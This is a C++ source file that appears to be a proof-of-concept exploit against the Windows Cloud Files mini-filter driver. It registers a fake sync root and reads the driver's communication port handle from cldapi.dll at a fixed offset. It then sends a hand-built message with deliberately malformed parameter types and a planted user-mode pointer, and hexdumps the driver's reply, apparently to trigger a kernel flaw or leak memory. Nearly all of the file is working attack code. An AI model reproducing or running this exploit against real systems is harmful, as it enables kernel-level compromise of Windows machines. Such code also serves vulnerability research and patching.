
#include <Windows.h>
#include <stdio.h>
#include <fltuser.h>
#include <cfapi.h>
#include <winternl.h>

#include "defs.h"

#pragma comment(lib, "FltLib.lib")
#pragma comment(lib, "CldApi.lib")

void hexdump(void* ptr, int buflen) {
    unsigned char* buf = (unsigned char*)ptr;
    int i, j;
    for (i = 0; i < buflen; i += 16) {
        printf("%06x: ", i);
        for (j = 0; j < 16; j++)
            if (i + j < buflen)
                printf("%02x ", buf[i + j]);
            else
                printf("   ");
        printf(" ");
        for (j = 0; j < 16; j++)
            if (i + j < buflen)
                printf("%c", isprint(buf[i + j]) ? buf[i + j] : '.');
        printf("\n");
    }
};

void* load_function(const wchar_t* lib_name, const char* func_name) {
    HMODULE hLib = LoadLibraryW(lib_name);
    if(hLib == nullptr) {
        wprintf(L"[ ! ] Cannot load %s library", lib_name);
        return nullptr;
    }

    void* function = GetProcAddress(hLib, func_name);
    if(function == nullptr) {
        wprintf(L"[ ! ] Cannot load %s function", func_name);
        return nullptr;
    }

    return function;
}

PCLDFLT_HYDRATION_DATA build_packet(const CF_CONNECTION_KEY connection_key, const CF_TRANSFER_KEY transfer_key, const FILE_ID_INFO file_id) {
    PCLDFLT_HYDRATION_DATA payload = (PCLDFLT_HYDRATION_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
    if(payload == nullptr) {
        wprintf(L"[ ! ] Unable to allocate input buffer\n");
        return nullptr;
    }

    payload->sig = CLDFLT_SIG;
    payload->flags = 0x170000;
    payload->nBytes = 0x1000;
    payload->nParam = 23;

    // fill all parameters with some values
    for(int i = 0; i < payload->nParam; i++) {
        payload->params[i].type = CLDFLT_PARAM_TYPE_UINT64;
        payload->params[i].ioff = 200;
        payload->params[i].size = 8;
    }

    // some specific parameters will be validated separately:
    // CldiPortNotifyMessage: 0, 1, 4, 7, 8 (actually: all params (23) -> 0 -> 1 -> 8 -> 4 -> 7)
    // CldiPortProcessGetRangeInfo: 13 - 18

    // CldiPortNotifyMessage
    payload->params[0].type = CLDFLT_PARAM_TYPE_UINT8;
    payload->params[0].size = 1;

    payload->params[1].type = CLDFLT_PARAM_TYPE_UINT16;
    payload->params[1].size = 2;

    payload->params[8].type = CLDFLT_PARAM_TYPE_HANDLE + CLDFLT_PARAM_TYPE_UINT64; // for some funny check below
    payload->params[8].size = 0x82;

    payload->params[4].ioff = 220;

    payload->params[7].ioff = 240;

    payload->params[13].ioff = 260;
    
    payload->params[14].type = CLDFLT_PARAM_TYPE_UINT32;
    payload->params[14].size = 4;
    payload->params[14].ioff = 280;

    payload->params[15].ioff = 300;

    payload->params[16].ioff = 320;

    payload->params[17].type = CLDFLT_PARAM_TYPE_HANDLE;
    payload->params[17].ioff = 340;

    payload->params[18].type = CLDFLT_PARAM_TYPE_UINT32;
    payload->params[18].size = 4;
    payload->params[18].ioff = 360;

    // insert message type
    *(UINT64 *)((char *)payload + sizeof(CLDFLT_HYDRATION_DATA)) = CLDFLT_MESSAGE_GET_PROCESS_RANGE_INFO;

    *(UINT64 *)((char *)payload + payload->params[4].ioff) = connection_key.Internal;
    *(UINT64 *)((char *)payload + payload->params[7].ioff) = transfer_key.QuadPart;

    memcpy((void *)((char *)payload + payload->params[13].ioff), (void *)file_id.FileId.Identifier, sizeof(file_id.FileId.Identifier));
    *(UINT64 *)((char *)payload + payload->params[14].ioff) = CF_PLACEHOLDER_RANGE_INFO_VALIDATED;
    *(UINT64 *)((char *)payload + payload->params[15].ioff) = 0;
    *(UINT64 *)((char *)payload + payload->params[16].ioff) = 0;

    // allocate buffer for param 17 and save length at 18
    void* buf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
    if(buf == nullptr) {
        wprintf(L"[ ! ] Unable to allocate param 17 buffer\n");
        return nullptr;
    }

    *(UINT64 *)((char *)payload + payload->params[17].ioff) = (UINT64)buf;
    *(UINT64 *)((char *)payload + payload->params[18].ioff) = 0x1000;

    // load RtlComputeCrc32 function 
    void* crc_func = load_function(L"ntdll.dll", "RtlComputeCrc32");
    if(crc_func == nullptr)
        return nullptr;

    RtlComputeCrc32 = (__T_RtlComputeCrc32)crc_func;

    // compute CRC32 checksum
    payload->checksum = RtlComputeCrc32(0, (PBYTE)payload, 0x1000);

    return payload;
}

bool get_transfer_key(const wchar_t* file, CF_TRANSFER_KEY& transfer_key) {
    DWORD len = (DWORD)((wcslen(file) + 1) * sizeof(wchar_t));
    
    HANDLE hFile;
    HRESULT hr = CfOpenFileWithOplock(file, CF_OPEN_FILE_FLAG_EXCLUSIVE, &hFile);
    if(FAILED(hr)) {
        wprintf(L"[ ! ] CfOpenFileWithOplock (0x%llX)\n", hr);
        return false;
    }

    hr = CfConvertToPlaceholder(hFile, file, len, CF_CONVERT_FLAG_MARK_IN_SYNC, nullptr, nullptr);
    if(FAILED(hr)) {
        wprintf(L"CfConvertToPlaceholder (0x%llX)\n", hr);
        return false;
    }

    hr = CfGetTransferKey(hFile, &transfer_key);
    if(FAILED(hr)) {
        wprintf(L"[ ! ] CfGetTransferKey failed with 0x%llX\n", hr);
        return false;
    }

    return true;
}

HRESULT init_syncroot(const wchar_t* dir, CF_CONNECTION_KEY& key) {
    CF_SYNC_REGISTRATION reg = { 0 };
    reg.StructSize = sizeof(CF_SYNC_REGISTRATION);
    reg.ProviderName = L"test";
    reg.ProviderVersion = L"0.1";
    reg.ProviderId = { 0 };

    CF_SYNC_POLICIES policies = { 0 };
    policies.StructSize = sizeof(policies);
    policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    policies.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
    policies.InSync = CF_INSYNC_POLICY_NONE;
    policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;

    HRESULT hr = CfRegisterSyncRoot(dir, &reg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
    if (FAILED(hr)) {
        wprintf(L"[ ! ] CfRegisterSyncRoot failed with 0x%llX\n", hr);
        return hr;
    }

    CF_CALLBACK_REGISTRATION table[1];
    table[0].Callback = nullptr;
    table[0].Type = CF_CALLBACK_TYPE_NONE;

    hr = CfConnectSyncRoot(dir, (CF_CALLBACK_REGISTRATION*)&table, nullptr, CF_CONNECT_FLAG_NONE, &key);
    if (FAILED(hr)) {
        wprintf(L"[ ! ] CfConnectSyncRoot failed with 0x%llX\n", hr);
        return hr;
    }

    return hr;
}

bool setup_system(const wchar_t* dir, const wchar_t* file, FILE_ID_INFO& file_id) {
    // create syncroot dir
    if(!CreateDirectoryW(dir, nullptr)) {
        DWORD err = GetLastError();
        if(err != ERROR_ALREADY_EXISTS) {
            wprintf(L"[ ! ] Cannot create directory (0x%X)\n", err);
            return false;
        }
    }
    
	// create future placeholder file
    HANDLE hFile = CreateFileW(file, GENERIC_ALL, (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE), nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if(hFile == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        if(err == ERROR_ALREADY_EXISTS) {
            // shouldn't fail
            hFile = CreateFileW(file, GENERIC_ALL, (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE), nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        } else {
            wprintf(L"[ ! ] Cannot create file (0x%X)\n", GetLastError());
            return false;
        }
    }

    if(!GetFileInformationByHandleEx(hFile, FileIdInfo, &file_id, sizeof(file_id))) {
        wprintf(L"[ ! ] Cannot obtain file ID (0x%X)\n", GetLastError());
        return false;
    }

    CloseHandle(hFile);

    return true;
}

int main(int argc, char** argv) {
    const wchar_t* syncroot_directory = L"C:\\catwife";
    const wchar_t* placeholder_file = L"C:\\catwife\\cardiac_arrest.slt";

    FILE_ID_INFO file_id = { 0 };
    if(!setup_system(syncroot_directory, placeholder_file, file_id))
        return -1;

    HMODULE hCldApi = LoadLibraryW(L"cldapi.dll");
    if (!hCldApi) {
        wprintf(L"[ ! ] Failed to load cldapi.dll\n");
        return -1;
    }

    wprintf(L"[ + ] CldApi.dll imagebase: 0x%llX\n", hCldApi);

    CF_CONNECTION_KEY key = { 0 };
    HRESULT hr = init_syncroot(syncroot_directory, key);
    if (FAILED(hr)) {
        return -1;
    }

    wprintf(L"[ + ] Connection key: 0x%llX\n", key.Internal);
    
    CF_TRANSFER_KEY transfer_key = { 0 };
    BY_HANDLE_FILE_INFORMATION placeholder_info = { 0 };
    if(!get_transfer_key(placeholder_file, transfer_key))
        return -1;

    wprintf(L"[ + ] Transfer key: 0x%llX\n", transfer_key.QuadPart);

    HANDLE hPort = *(PHANDLE)((PUINT8)(hCldApi) + RVA_hPort);

    wprintf(L"[ + ] CldFlt global hPort: 0x%llX\n", hPort);
    wprintf(L"[ + ] Building data packet\n");

    PCLDFLT_HYDRATION_DATA packet = build_packet(key, transfer_key, file_id);
    if(packet == nullptr)
        return -1;
        
    void* output = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x40);
    if(output == nullptr) {
        wprintf(L"[ ! ] Cannot allocate output buffer\n");
        return -1;
    }
    
    wprintf(L"[ + ] Sending buffer\n");

    DWORD ret = 0;
    FilterSendMessage(hPort, packet, 0x1000, output, 0x40, (LPDWORD)&ret);

    wprintf(L"[ + ] Output buffer: \n");
    hexdump(output, 0x40);

    return 0;
}